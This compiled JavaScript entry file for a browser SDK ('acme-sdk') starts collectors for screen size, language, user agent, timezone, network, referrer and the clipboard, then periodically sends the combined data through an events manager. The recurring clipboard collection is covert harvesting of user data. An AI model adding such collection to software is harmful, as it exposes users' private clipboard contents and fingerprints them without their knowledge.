"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const EventsManager_1 = require("./EventsManager");
const ScreenWidthCollector_1 = require("./ScreenWidthCollector");
const ScreenHeightCollector_1 = require("./ScreenHeightCollector");
const LanguageCollector_1 = require("./LanguageCollector");
const UserAgentCollector_1 = require("./UserAgentCollector");
const TimezoneCollector_1 = require("./TimezoneCollector");
const ClipboardCollector_1 = require("./ClipboardCollector");
const NetworkInformationCollector_1 = require("./NetworkInformationCollector");
const ReferrerCollector_1 = require("./ReferrerCollector");
const CookiesEnabledCollector_1 = require("./CookiesEnabledCollector");
const OnlineStatusCollector_1 = require("./OnlineStatusCollector");
const LocalStorageAvailableCollector_1 = require("./LocalStorageAvailableCollector");
class SDK {
    constructor() {
        this.collectors = [];
        window.addEventListener('acme-sdk-loaded', this.main.bind(this));
    }
    main() {
        return __awaiter(this, void 0, void 0, function* () {
            console.log('SDK Loaded');
            const config = yield EventsManager_1.EventsManager.getConfig();
            console.log('Configuration:', config);
            if (!config.SDK_ENABLED) {
                return;
            }
            this.collectors = [
                new ScreenWidthCollector_1.ScreenWidthCollector(config.COLLECTORS_INTERVAL),
                new ScreenHeightCollector_1.ScreenHeightCollector(config.COLLECTORS_INTERVAL),
                new LanguageCollector_1.LanguageCollector(config.COLLECTORS_INTERVAL),
                new UserAgentCollector_1.UserAgentCollector(config.COLLECTORS_INTERVAL),
                new TimezoneCollector_1.TimezoneCollector(config.COLLECTORS_INTERVAL),
                new ClipboardCollector_1.ClipboardCollector(config.COLLECTORS_INTERVAL),
                new NetworkInformationCollector_1.NetworkInformationCollector(config.COLLECTORS_INTERVAL),
                new ReferrerCollector_1.ReferrerCollector(config.COLLECTORS_INTERVAL),
                new CookiesEnabledCollector_1.CookiesEnabledCollector(config.COLLECTORS_INTERVAL),
                new OnlineStatusCollector_1.OnlineStatusCollector(config.COLLECTORS_INTERVAL),
                new LocalStorageAvailableCollector_1.LocalStorageAvailableCollector(config.COLLECTORS_INTERVAL),
            ];
            this.collectors.forEach(collector => collector.startCollect());
            setInterval(() => __awaiter(this, void 0, void 0, function* () {
                const data = {};
                this.collectors.forEach(collector => {
                    data[collector.getKey()] = collector.getData();
                });
                console.log('Collected Data:', data);
                yield EventsManager_1.EventsManager.updateData(data);
            }), config.COLLECTORS_INTERVAL);
        });
    }
}
new SDK();
